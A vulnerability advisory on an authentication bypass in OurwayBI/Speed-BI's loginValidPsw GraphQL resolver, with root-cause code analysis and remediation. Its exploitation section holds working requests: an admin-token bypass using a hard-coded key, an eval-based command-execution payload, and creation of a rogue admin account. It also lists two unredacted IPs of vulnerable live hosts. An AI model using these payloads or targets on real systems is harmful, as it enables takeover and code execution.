# OurwayBI / Speed-BI — Authentication Bypass in loginValidPsw (iscas mode)

## 1. Overview

| Item | Value |
|---|---|
| Product | OurwayBI / Speed-BI |
| Vendor | Zhuhai Ourway Software Technology Co., Ltd. |
| Affected component | Cross_SBI_API (GraphQL backend, default port 4367) |
| Affected version | 8.11.101 (source analysis); 8.10.89 (verified) |
| Authentication required | None |
| CWE | CWE-287 Improper Authentication; CWE-306 Missing Authentication for Critical Function |
| CVSS 3.1 | 9.8 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |

## 2. Description

OurwayBI (also marketed as Speed-BI) is a commercial business-intelligence
platform by Zhuhai Ourway Software Technology, offering report design, data
visualisation, self-service analytics and multi-datasource integration. Its
Node.js component Cross_SBI_API exposes login, reporting and datasource
capabilities as GraphQL fields under `/api/graphql`.

**The product is closed source.** The code presented here was recovered from
the server-side JavaScript bundle shipped with the product and cross-checked
against the login responses of live instances.

The login mutation `loginValidPsw` accepts a client-supplied boolean argument
named `iscas`, meant to mark a CAS single-sign-on login. When it is `true`, the
resolver sets its internal flag `validepsw` to `false`, which removes the
password condition from the user lookup entirely.

The only check that remains in this branch compares the client-supplied
`serverKey` against a hard-coded fallback:

```js
_.get(Config, "api.serverKey", "ourwayhq!@#")
```

On any deployment that never configured `api.serverKey`, that constant is the
effective secret. An unauthenticated attacker who knows it receives
`verify:true` plus a valid session token for **any known username**, including
`admin`.

## 3. Root cause

### 3.1 Control flow — the password condition is skipped, not bypassed

`loginValidPsw` is compiled into a regenerator state machine
(`Login.pretty.js`). The relevant branches:

```js
// 449 — iscas is an ordinary GraphQL argument, controlled by the client
}else if(iscas) validepsw = false;

// 450 — build the query
case 186: select1 = knex.select(...).from("t_user");

// 451-453 — validepsw false -> jump to 192, skipping the whole password block
if(!(validepsw || regOffice == true)) { _context2.next = 192; break; }

// 461-462 — executed only when validepsw is true
select1 = select1.where("t_user.username", fusername)
                 .where("t_user.userpassword", userpswmd5);

// 465-469 — after skipping, only serverKey is compared
case 192: if(!(serverKey != _.get(Config, "api.serverKey", "ourwayhq!@#"))) {
              _context2.next = 194; break;
          }
          return reject(new Error("服务端密钥错误！"));
case 194: select1 = select1.where("t_user.username", fusername);
```

The important detail: the password predicate is not ignored after a failed
comparison — **the branch containing it is never executed**. That changes the
audit question from "which check is wrong" to "which flags does the client
control".

![image-20261123205023413](./图片.assets/image-20261123205023413.png)

![image-20261123205225668](./图片.assets/image-20261123205225668.png)

### 3.2 The default key is a public key

The third argument of `_.get` is a default. Unless the operator explicitly
configures `api.serverKey`, the hard-coded string is the effective key, and is
therefore public. Every instance tested had left it unconfigured, so the first
request succeeded.

### 3.3 Five sibling branches in the same function

`validepsw = false` appears six times in `loginValidPsw`, all of them
password-free paths:

| Line | Condition | Source |
|---|---|---|
| 299 | `OAL == ftoken` | third-party SSO token |
| 342 | username parsed by `getTokenJson(qxiandlxt)` | third-party token |
| 408 | `fusernametemp != ""` | WeChat mini-program code |
| 431 | `validepsw = !getReg` | registration flow |
| 448 | `shareFcreateuser != ""` | creator of a share link |
| **449** | **`iscas`** | **the vector used here** |

`iscas` is not the only entry point — it is simply the cheapest, because it
requires nothing but a public constant. A fix must audit all six.

### 3.4 Related: pass-the-hash in the same file

`Login.pretty.js:137`:

```js
if ((pswmd5 != true && getReg != true || regOffice == true) && fuserpsw != null && fuserpsw != "")
    userpswmd5 = crypto.createHash("md5").update(fuserpsw).digest("hex")
```

When the client sets `pswmd5:true`, the server does **not** hash the password
and compares the submitted value directly. Stored passwords are unsalted MD5,
so anyone who obtains a hash through another channel (the SQL injection
reported separately) can log in without cracking it. This is a distinct defect
and should be fixed independently.

## 4. Exploitation

### 4.1 Obtain an administrator session without a password

```http
POST /api/graphql HTTP/1.1
Host: <target>:8080
Content-Type: application/json

{"query":"{loginValidPsw(fusername:\"admin\",iscas:true,serverKey:\"ourwayhq!@#\")}"}
```

The resolver returns a JSON string:

```json
{"verify":true,"fusername":"admin","fisadmin":true,"fuserid":"1",
 "ftoken":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```

Replacing `fusername` authenticates as any other known account.

![image-20261117113350758](./图片.assets/image-20261117113350758.png)

### 4.2 What the token grants

The token is a genuine administrator session. In testing it was used to reach
the `eval()`-based `getConnList` field and execute commands:

```http
POST /api/graphql HTTP/1.1
Host: <target>:8068
Content-Type: application/json

{"query":"{getConnList(fconnids:\"(function(){var o=require('child_process').execSync(\\\"id && ip a && whoami\\\",{encoding:'utf8'}).toString();throw new Error('RCEOUT['+o+']')})()\")}","ftoken":"<token>","ftokenswarm":""}
```

![image-20261117124414212](./图片.assets/image-20261117124414212.png)

To demonstrate privilege without altering the administrator password, a new
administrator account was created with `userAdd`:

```http
POST /api/graphql HTTP/1.1
Host: <target>:8068
Content-Type: application/json

{"query":"mutation{userAdd(username:\"poc_test01\",userpassword:\"e10adc3949ba59abbe56e057f20f883e\",userrealname:\"poc\",fisadmin:true){username fisadmin userid}}","ftoken":"<token>","ftokenswarm":""}
```

![image-20261117125429911](./图片.assets/image-20261117125429911.png)

### 4.3 Affected deployments

The bypass reproduced on multiple internet-facing instances of the product.

| Instance | Result |
|---|---|
| `powerbi.<redacted>:8068` | `verify:true`, administrator token |
| `sxjxfsbapi.<redacted>:8080` | `verify:true`, administrator token |
| `220.160.117.106:88` | `verify:true`, administrator token |
| `admin.<redacted>:8080` | `verify:true`, administrator token |
| `222.78.251.54:10019` | `verify:true`, administrator token |

![image-20261119203047624](./图片.assets/image-20261119203047624.png)

![image-20261119203451469](./图片.assets/image-20261119203451469.png)

![image-20261119203443437](./图片.assets/image-20261119203443437.png)

![image-20261119203729480](./图片.assets/image-20261119203729480.png)

![image-20261119203816804](./图片.assets/image-20261119203816804.png)

![image-20261119203940473](./图片.assets/image-20261119203940473.png)

![image-20261119203923271](./图片.assets/image-20261119203923271.png)

![image-20261119204104638](./图片.assets/image-20261119204104638.png)

![image-20261119204048163](./图片.assets/image-20261119204048163.png)

![image-20261117130059602](./图片.assets/image-20261117130059602.png)

## 5. Proof of concept

A standalone Python PoC is bundled with this report. It performs only the login
request and prints the token; it does not create users or execute commands.

## 6. Impact

- Full administrative takeover without credentials, for any known username
- Persistent administrator accounts via `userAdd`
- Access to every administrative GraphQL operation, including arbitrary SQL
  execution against configured data sources (`designExeSql`) and command
  execution through the `eval()`-based fields (`getConnList`, `getSQL`,
  `getReviewObjs`)
- Account enumeration: the response distinguishes existing from missing users

## 7. Remediation

1. Remove the client-controlled bypass. Any single-sign-on identity must derive
   from a server-side ticket validation, never from a request flag.
2. Delete the hard-coded default secret; make the server key mandatory
   configuration with no fallback, and compare it in constant time.
3. Audit all six `validepsw = false` branches in `loginValidPsw`.
4. Require additional verification (MFA / step-up) for administrative
   accounts regardless of the login mode.
5. Rotate every token issued by affected deployments.

## 8. Legal

All testing was performed against systems the reporter is authorised to
assess. Hostnames of third-party deployments have been replaced with
placeholders.
